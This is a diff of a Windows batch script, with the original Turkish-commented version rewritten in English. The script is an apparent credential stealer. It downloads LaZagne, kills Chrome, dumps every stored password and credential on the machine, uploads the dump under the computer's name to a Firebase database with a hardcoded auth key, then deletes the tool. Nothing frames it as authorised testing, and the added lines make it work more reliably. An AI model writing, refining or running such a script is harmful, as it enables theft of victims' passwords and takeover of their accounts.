@@ -1,119 +1,115 @@
 @echo off
+chcp 65001 >nul
 setlocal enabledelayedexpansion
 
-:: Ayarlar
-set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
-set "LAZ_EXE=%TEMP%\lazagne.exe"
-set "RESULT_DIR=%TEMP%\results"
-set "FIREBASE_BASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
-set "LOG_FILE=%TEMP%\lazagne_script_log.txt"
-
-:: Log dosyasını temizle ve başlangıç mesajını ekle
-echo ------------------------------------------------------------ > "%LOG_FILE%"
-echo [INFO] Script basladi: %DATE% %TIME% >> "%LOG_FILE%"
-echo ------------------------------------------------------------ >> "%LOG_FILE%"
+:: Settings
+set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
+set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
+set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
+set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
+set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
 
 echo ------------------------------------------------------------
-echo [INFO] Script basladi: %DATE% %TIME%
+echo [INFO] Script started: %DATE% %TIME% (19:48 +03, 14 June 2025)
 echo ------------------------------------------------------------
 
-:: Lazagne.exe yoksa indir
-if not exist "%LAZ_EXE%" (
-    echo [INFO] Lazagne.exe bulunamadi, indiriliyor... >> "%LOG_FILE%"
-    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
+:: 1. LaZagne check and download
+echo [1/5] Checking LaZagne...
+echo [DEBUG] URL: %LAZAGNE_URL%
+if not exist "%LAZAGNE_EXE%" (
+    echo   Downloading...
+    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
     if errorlevel 1 (
-        echo [ERROR] Lazagne indirilemedi! >> "%LOG_FILE%"
+        echo   [ERROR] Download failed! Check details below.
         pause
         exit /b 1
     )
-    echo [OK] Lazagne indirildi. >> "%LOG_FILE%"
+    if not exist "%LAZAGNE_EXE%" (
+        echo   [ERROR] File not downloaded, check internet or URL.
+        pause
+        exit /b 1
+    )
+    echo   [OK] Successfully downloaded.
 ) else (
-    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor. >> "%LOG_FILE%"
+    echo   [OK] Already installed.
 )
+pause
 
-:: Chrome varsa kapat
+:: 2. Chrome closure
+echo [2/5] Checking browser...
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
-if errorlevel 1 (
-    echo [INFO] Chrome acik degil. >> "%LOG_FILE%"
-) else (
-    echo [INFO] Chrome calisiyor, kapatiliyor... >> "%LOG_FILE%"
+if %errorlevel% == 0 (
     taskkill /IM chrome.exe /F >nul 2>&1
-    if errorlevel 1 (
-        echo [WARN] Chrome kapatilamadi. >> "%LOG_FILE%"
-    ) else (
-        echo [OK] Chrome kapatildi. >> "%LOG_FILE%"
-    )
+    echo   [OK] Chrome closed.
+) else (
+    echo   [INFO] Chrome already closed.
 )
+pause
 
-:: Sonuç klasörünü oluştur
-if not exist "%RESULT_DIR%" (
-    echo [INFO] Sonuc klasoru olusturuluyor... >> "%LOG_FILE%"
-    mkdir "%RESULT_DIR%"
+:: 3. Output directory creation
+echo [3/5] Creating output directory...
+if not exist "%OUTPUT_DIR%" (
+    mkdir "%OUTPUT_DIR%" 2>nul
     if errorlevel 1 (
-        echo [ERROR] Sonuc klasoru olusturulamadi! >> "%LOG_FILE%"
+        echo   [ERROR] Failed to create directory!
         pause
         exit /b 1
     )
 )
-echo [OK] Sonuc klasoru: %RESULT_DIR% >> "%LOG_FILE%"
+echo   [OK] Directory ready: %OUTPUT_DIR%
+pause
 
-:: Kod sayfasını UTF-8 olarak ayarla
-chcp 65001 >nul
-echo [INFO] Kod sayfasi UTF-8 olarak ayarlandi. >> "%LOG_FILE%"
-
-:: LaZagne ile tüm credential’ları topla
-if not exist "%LAZ_EXE%" (
-    echo [ERROR] Lazagne.exe bulunamadi! >> "%LOG_FILE%"
+:: 4. Data collection
+echo [4/5] Collecting credentials...
+if not exist "%LAZAGNE_EXE%" (
+    echo   [ERROR] LaZagne.exe not found!
     pause
     exit /b 1
 )
-echo [INFO] LaZagne calistiriliyor... >> "%LOG_FILE%"
-echo Running: "%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >> "%LOG_FILE%"
-"%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >nul 2>&1
+echo   [INFO] Running LaZagne...
+"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
 if errorlevel 1 (
-    echo [ERROR] LaZagne calistirilirken hata olustu. >> "%LOG_FILE%"
-) else (
-    echo [OK] LaZagne calistirildi. >> "%LOG_FILE%"
+    echo   [ERROR] Error running LaZagne!
+    pause
+    exit /b 1
 )
+echo   [OK] LaZagne ran, waiting for output...
 
-:: En son oluşturulan .txt dosyasını bul
-set "RESULT_FILE="
-for /f "delims=" %%i in ('dir "%RESULT_DIR%\*.txt" /b /od 2^>nul') do (
-    set "RESULT_FILE=%%i"
-)
+:: Check for result file
+for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
 if not defined RESULT_FILE (
-    echo [ERROR] Sonuc dosyasi bulunamadi! >> "%LOG_FILE%"
+    echo   [ERROR] No result file found! Checking directory: %OUTPUT_DIR%
+    dir "%OUTPUT_DIR%"
     pause
     exit /b 1
 )
-echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE! >> "%LOG_FILE%"
+echo   [OK] Result file found: %OUTPUT_DIR%\%RESULT_FILE%
+pause
 
-:: Zaman damgası oluştur (örnek: 20250614_192345)
-set "TIMESTAMP=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
-set "TIMESTAMP=!TIMESTAMP: =0!"
-echo [DEBUG] TIMESTAMP: !TIMESTAMP! >> "%LOG_FILE%"
-
-:: Firebase URL'yi hazırla
-set "FIREBASE_URL=%FIREBASE_BASE_URL%/uploads/!TIMESTAMP!"
-echo [DEBUG] Firebase URL: %FIREBASE_URL%.json >> "%LOG_FILE%"
-
-:: Sonuçları Firebase'e yükle (curl ile)
-echo [INFO] Sonuclar Firebase'e yukleniyor... >> "%LOG_FILE%"
-set "FULL_PATH=%RESULT_DIR%\!RESULT_FILE!"
-curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%.json" --silent --show-error
+:: 5. Firebase upload
+echo [5/5] Uploading to Firebase...
+set "PC_NAME=%COMPUTERNAME%"
+set "PC_NAME=!PC_NAME: =_!"
+set "PC_NAME=!PC_NAME:-=_!"
+echo   [DEBUG] PC Name: %PC_NAME%
+powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'; if($response) { Write-Host '  [OK] Success!' } else { Write-Host '  [ERROR] Upload failed!' }"
 if errorlevel 1 (
-    echo [ERROR] !RESULT_FILE! yuklenemedi! >> "%LOG_FILE%"
-    echo [DEBUG] Kullanilan URL: %FIREBASE_URL%/!RESULT_FILE!.json >> "%LOG_FILE%"
+    echo   [ERROR] Firebase upload failed!
     pause
     exit /b 1
-) else (
-    echo [OK] !RESULT_FILE! yuklendi. >> "%LOG_FILE%"
 )
+echo   [OK] Firebase upload successful!
+pause
 
+:: Cleanup
+echo [INFO] Cleaning up...
+del /q "%LAZAGNE_EXE%" >nul 2>&1
+echo   [OK] Cleanup completed.
+
+:: Final message
 echo ------------------------------------------------------------
-echo [INFO] Tum islem tamamlandi: %DATE% %TIME% >> "%LOG_FILE%"
+echo [INFO] Process completed: %DATE% %TIME%
+echo Firebase location: %FIREBASE_URL%/%PC_NAME%
 echo ------------------------------------------------------------
-echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
-echo Cikmak icin bir tusa basin...
-pause >nul
+pause
 exit /b 0
